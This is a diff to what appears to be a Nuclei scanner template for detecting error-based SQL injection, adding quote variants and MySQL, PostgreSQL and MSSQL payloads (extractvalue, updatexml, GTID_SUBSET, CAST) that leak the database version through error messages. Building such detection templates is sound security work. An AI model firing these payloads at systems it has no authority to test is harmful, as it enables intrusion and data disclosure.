@@ -13,7 +13,7 @@ info:
   classification:
     cwe-id: CWE-89
   metadata:
-    max-request: 279
+    max-request: 496
   tags: sqli,injection,error-based,database
 
 http:
@@ -24,10 +24,19 @@ http:
         - "'"
         - "%27"
         - "%22"
+        - '"'
+        - "')"
+        - "'))"
         - "%5c"                 # backslash (\) — escape-bozma
         - "%22%22|0;#"
         - "') OR 1=1-- -"
         - "' AND 1=CONVERT(int,@@version)-- -"   # MSSQL hata tetikleme
+        # Hata tabanlı çıkarım — DB sürümünü hata mesajında açığa çıkarır
+        - "' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -"   # MySQL XPATH hatası
+        - "' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -"    # MySQL updatexml
+        - "' AND GTID_SUBSET(concat(0x7e,(SELECT version())),1)-- -"    # MySQL GTID
+        - "' AND 1=CAST((SELECT version()) AS int)-- -"                 # PostgreSQL/MSSQL cast
+        - "' AND 1=(SELECT COUNT(*) FROM generate_series(1,1))::text::int-- -"  # PostgreSQL
         - "%E2%84%A2%22"
         - "%E2%84%A2%27"
     attack: batteringram
